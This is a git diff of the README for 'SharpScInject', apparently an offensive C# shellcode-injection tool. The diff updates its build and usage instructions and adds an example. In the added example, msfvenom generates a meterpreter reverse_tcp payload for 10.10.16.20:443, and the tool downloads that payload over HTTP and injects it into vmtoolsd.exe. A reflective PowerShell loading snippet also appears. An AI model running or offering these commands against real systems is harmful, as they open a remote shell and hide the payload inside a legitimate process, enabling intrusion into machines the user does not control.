@@ -6,12 +6,12 @@ The https certificate for the request is ignored.
 ## Build
 ```
 sudo apt install -y mono-complete
-./build.sh
+mcs /reference:System.Net.Http SharpScInject.cs
 ```
 
 ## Usage
 ```
-SharpScInject.exe <PID> <Shell Code PATH / URL>
+SharpScInject.exe <PID_or name> <Shell Code PATH / URL>
 ```
 
 
@@ -29,4 +29,9 @@ $argu= New-Object -TypeName System.Collections.ArrayList
 $strings = $argument.Split(" ")
 $argu.Add($strings)
 $method.Invoke($null, $argu.ToArray())
+```
+## example
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.20  LPORT=443 -f raw -o a.raw
+.\SharpScInject.exe vmtoolsd.exe http://10.10.16.20/a.raw
 ```
